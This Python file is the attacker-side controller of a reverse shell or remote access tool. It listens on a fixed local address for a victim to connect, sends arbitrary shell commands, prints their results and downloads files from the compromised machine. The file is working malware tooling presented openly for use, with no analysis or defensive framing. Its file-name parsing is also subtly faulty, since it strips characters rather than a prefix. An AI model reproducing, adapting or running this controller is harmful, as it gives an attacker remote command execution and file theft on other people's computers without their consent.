import socket

IDENTIFIER = b"<END_OF_COMMAND_RESULT>"
EOF_IDENTIFIER = b"<END_OF_FILE_IDENTIFIER>"
CHUNK_SIZE = 2048

def receive_file(client_socket, file_name):
    with open(file_name, "wb") as file:
        print("Downloading file")
        while True:
            chunk = client_socket.recv(CHUNK_SIZE)
            if chunk.endswith(EOF_IDENTIFIER):
                chunk = chunk[:-len(EOF_IDENTIFIER)]
                file.write(chunk)
                print("Successfully downloaded", file_name)
                break
            file.write(chunk)

if __name__ == "__main__":
    hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    IP = "192.168.1.26"
    PORT = 8200
    socket_address = (IP, PORT)
    hacker_socket.bind(socket_address)
    hacker_socket.listen(5)
    print("Listening for incoming connection requests")
    
    client_socket, client_address = hacker_socket.accept()
    print("Connection established with", client_address)
    
    try:
        while True: 
            command = input("Enter the command: ")
            client_socket.send(command.encode())
            
            if command == "stop":
                client_socket.close()
                break
            elif command == "":
                continue
            elif command.startswith("cd"):
                continue
            elif command.startswith("download"):
                print('Starting download')
                exist = client_socket.recv(1024)
                if exist.decode() == 'yes':  
                    print("File exists")
                    file_name = command.strip("download").strip()
                    receive_file(client_socket, file_name)
                else:
                    print("File doesn't exist")
            elif command == "screenshot":
                print("Taking screenshot")
            else:
                full_command_result = b''
                while True:
                    chunk = client_socket.recv(1048)
                    if chunk.endswith(IDENTIFIER):
                        chunk = chunk[:-len(IDENTIFIER)]
                        full_command_result += chunk
                        break
                    full_command_result += chunk
                print(full_command_result.decode('utf-8', errors='ignore'))
    except Exception as e:
        print(f"Exception occurred: {e}")
        client_socket.close()

